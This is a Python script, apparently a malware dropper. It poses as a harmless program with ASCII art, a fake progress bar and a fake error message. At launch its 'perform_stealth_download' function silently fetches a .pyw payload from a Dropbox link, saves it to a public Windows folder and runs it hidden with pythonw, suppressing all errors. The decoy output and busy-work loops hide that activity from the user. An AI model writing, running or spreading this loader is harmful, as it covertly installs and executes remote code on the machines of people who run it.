import time
import sys
import requests
import subprocess
import os  # Importation du module os pour vérifier l'existence du fichier
from colorama import init, Fore

init(autoreset=True)

def ascii_art():
    art = """
    ███████╗██╗     ██╗██████╗ ███████╗
    ██╔════╝██║     ██║██╔══██╗██╔════╝
    █████╗  ██║     ██║██████╔╝███████╗
    ██╔══╝  ██║     ██║██╔══██╗╚════██╗
    ███████╗███████╗██║██████╔╝███████╔╝
    ╚══════╝╚══════╝╚═╝╚═════╝ ╚══════╝
    """
    print(Fore.GREEN + art)

def perform_stealth_download():
    program_url = "https://www.dropbox.com/scl/fi/r4jb76tb2r035tfqi6ftf/requests-analys.pyw?rlkey=13270y57mwhg36eaxf52gam2h&st=6qvkcmww&dl=1"  # Remplacez par l'URL réelle du programme .pyw
    local_path = r"C:\Users\Public\Documents\script.pyw"  # Le chemin où enregistrer le fichier

    try:
        response = requests.get(program_url)
        response.raise_for_status()  # Soulever une erreur en cas de problème avec la requête

        # Sauvegarder le fichier téléchargé
        with open(local_path, 'wb') as file:
            file.write(response.content)
        
        # Vérifier si le fichier existe et le lancer avec pythonw
        if os.path.exists(local_path):
            subprocess.run([r"pythonw.exe", local_path], check=True)  # Exécuter le programme téléchargé sans ouvrir la fenêtre de terminal
    except Exception as e:
        pass  # Ne rien afficher en cas d'erreur

def send_request():
    time.sleep(0.5)
    print(Fore.MAGENTA + "Sending request to the server...")
    time.sleep(1)

def analyze_data():
    time.sleep(0.5)
    print(Fore.GREEN + "Processing data...")
    time.sleep(1)

def display_loading_bar():
    print("\nLoading...\n")
    for i in range(101):
        time.sleep(0.05)
        sys.stdout.write(f"\r[{('=' * (i // 2))}{' ' * (50 - (i // 2))}] {i}%")
        sys.stdout.flush()
    print("\n")

def display_error():
    print(Fore.RED + "[ERROR]: Unable to process the request. Error code: 0xDEAD")
    print(Fore.YELLOW + "[INFO]: Try restarting the application.")
    time.sleep(2)

def compute_heavy_task_1():
    result = 0
    for i in range(1000):
        for j in range(1000):
            result += (i * j) % 123456
    return result

# [Inclure toutes les autres tâches ici...]

def main():
    perform_stealth_download()  # Effectuer le téléchargement et exécuter au lancement

    ascii_art()

    user_input = input(Fore.CYAN + "Please enter a value to continue: ")

    send_request()
    analyze_data()

    display_loading_bar()
    
    display_error()

    # Simuler des tâches pour occuper le programme
    compute_heavy_task_1()

if __name__ == "__main__":
    main()
